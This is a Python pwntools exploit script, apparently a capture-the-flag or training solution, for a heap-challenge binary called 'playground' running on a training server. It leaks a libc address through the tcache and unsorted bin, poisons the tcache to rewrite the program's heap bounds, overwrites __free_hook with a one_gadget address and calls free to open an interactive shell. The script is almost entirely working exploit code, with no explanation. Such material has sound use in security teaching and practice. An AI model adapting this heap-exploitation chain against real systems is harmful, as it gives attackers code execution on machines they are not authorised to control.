from pwn import *
import re
import sys


bin = ELF("./playground")
libc = ELF("./libc-2.27.so")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
        r = remote('bin.training.jinblack.it', 4010)
else:
    r = process("./ld-2.27.so --library-path ./ ./playground".split(), executable="./playground")
    commands = """
    #brva 0x1349
    #brva 0x14c9
    c
    """
    gdb.attach(r, commands)

def malloc(size) -> int:
    r.recvuntil(b"> ")
    r.sendline(b"malloc %d" %size)
    ptr = r.recvuntil(b"\n")
    ptr = int(re.match(b"==> 0[xX]([0-9a-fA-F]+)", ptr).group(1), base=16)
    log.debug("Allocated new chuck size: %d\nptr:%#x" %(size, ptr))
    return ptr

def write(ptr, content):
    r.recvuntil(b"> ")
    r.sendline(b"write %#x %d" %(ptr, len(content)))
    r.recvuntil(b"==> read", timeout=1)
    r.send(content)
    result = r.recvuntil(b"> ", timeout=1)
    if result.find(b"fail") != -1 :
        print("FAIL")
    reset_command()

def show(ptr, num_Dword):
    r.recvuntil(b"> ")
    r.sendline(b"show %#x %d" %(ptr, num_Dword))
    content = r.recvuntil(b"\n> ")[:-len(b"\n> ")].split(b"\n")
    log.debug("---------------start---------------")
    rlist = []
    for i in range(0, len(content)):
        m = re.findall(b"0[xX]([0-9a-fA-F]+)", content[i])
        if(len(m) == 2):
            log.debug("%#x: %#x" %(int(m[0], base=16), int(m[1], base=16)))
            rlist.append((m[0],m[1]))
        # else:
        #     log.debug("%#x:" %(int(m[0], base=16)))
    log.debug("----------------end----------------")
    reset_command()
    return rlist
    
def free(ptr):
    r.recvuntil(b"> ")
    r.sendline(b"free %#x" %ptr)
    r.recvuntil(b"==> ok")
    log.debug("Freed chunk at ptr: %#x" % ptr)

def parse_info():
    pid_string = r.recvuntil(b"\n")
    #pid: 7465
    global PID
    PID = int(re.match(b"pid: (\d+)", pid_string).group(1))
    log.debug("PID: %d" %PID)
    main_string = r.recvuntil(b"\n")
    #main: 0x555817a3d1d9
    global ADDR_MAIN
    ADDR_MAIN = int(re.match(b"main: 0[xX]([0-9a-fA-F]+)", main_string).group(1), base=16)
    log.debug("main: %#x" %ADDR_MAIN)
    
def reset_command():
    r.sendline(b"reset")
    r.recvuntil(b"Commands: malloc n, free p, show p [n], write p [n]\n")
    
def trigger():
    input("trigger")

def leak_libc():
    log_progress = log.progress("libc@leak: ")
    ptr_list = fill_tcache(n_malloc = 8, n_free = 7, size=0x100)
    ptr_victim = ptr_list.pop()
    free(ptr_victim)
    log.debug("PTR_VICTIM: %#x" %ptr_victim)
    result = show(ptr_victim, 1)
    global libc_leak
    libc_leak = int(result[0][1], base=16)
    log_progress.success("%#x" %libc_leak)
    #malloc(SIZE)

def fill_tcache(n_malloc, n_free, size) -> list():
    p = log.progress("Start fill for size: %#x" %size)
    l = malloc_and_free(n_malloc, n_free, size, logging.DEBUG)
    p.success()
    return l

def malloc_and_free(n_malloc, n_free, size, log_level=logging.INFO):
    ptr_list = []
    for i in range(0, n_malloc) :
        ptr = malloc(size)
        ptr_list.append(ptr)
        log.log(log_level, "malloc n: %d, %#x" %(i,ptr))
    for i in range(0, n_free) :
        ptr = ptr_list.pop()
        free(ptr)
        log.log(log_level, "free n: %d, %#x" %(i, ptr))
    return ptr_list

list_ptr_allocated = []

print("-------------------start-------------------")
parse_info()
leak_libc()
libc_base = libc_leak - 0x3ebca0
libc.address = libc_base

bin.address = ADDR_MAIN - 0x1d9
MAX_HEAP = bin.address + 0x00030a0
MIN_HEAP = MAX_HEAP + 8
malloc_hook = libc.symbols["__malloc_hook"]
free_hook = libc.symbols["__free_hook"]
log.info("!! libc@base: %#x" %libc.address)
log.info("!! libc@malloc_hook: %#x" %malloc_hook)
log.info("!! libc@free_hook: %#x" %free_hook)
log.info("!! Max heap address: %#x" %MAX_HEAP)
log.info("!! Min heap address: %#x" %MIN_HEAP)

SIZE = 0x60
#SETUP
list_ptr_allocated.append(malloc(SIZE))
list_ptr_allocated.append(malloc(SIZE))
free(list_ptr_allocated[1])
free(list_ptr_allocated[0])

for i in range(0, len(list_ptr_allocated)):
    log.info("chunk %d: %#x" %(i+1,list_ptr_allocated[i]))

write(list_ptr_allocated[0], p64(MIN_HEAP - 0x9))

ptr_chunk_3 = malloc(SIZE)
log.info("chunk 3: %#x" %ptr_chunk_3)

ptr_chunk_4 = malloc(SIZE)
log.info("chunk 4: %#x" %ptr_chunk_4)
write(MAX_HEAP, p64(0xffffffffffffff))
onegadget2 = libc.address + 0x4f432
log.info("[!] one_gadget_2: %#x" %onegadget2)

write(free_hook, p64(onegadget2))
r.recvuntil(b"> ")
r.sendline(b"free 0x0")
r.interactive()
